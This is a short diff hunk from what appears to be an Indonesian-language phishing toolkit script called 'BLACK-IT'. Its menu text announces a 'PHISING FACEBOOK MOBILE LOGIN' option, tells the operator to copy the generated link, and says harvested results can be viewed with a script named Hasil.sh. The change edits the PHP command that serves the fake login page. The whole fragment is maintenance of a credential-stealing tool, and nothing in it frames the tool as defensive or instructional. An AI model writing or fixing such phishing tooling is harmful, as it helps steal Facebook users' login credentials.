@@ -76,7 +76,7 @@ echo $pur"[+]PHISING FACEBOOK MOBILE LOGIN"
 echo $pur"[+]SALIN LINK YANG ADA DI TANDA ()"
 echo $pur"[+]JIKA INGIN MELIHAT HASIL BUKA SESSION BARU DAN KETIK sh Hasil.sh"
 echo $ku"----------------------------------------------------------------------------------"
-php -S localhost:8080 v2.php
+php -S localhost:8080 -t ~/BLACK-IT/v2.php
 fi
 
 if [ $pil = 4 ]
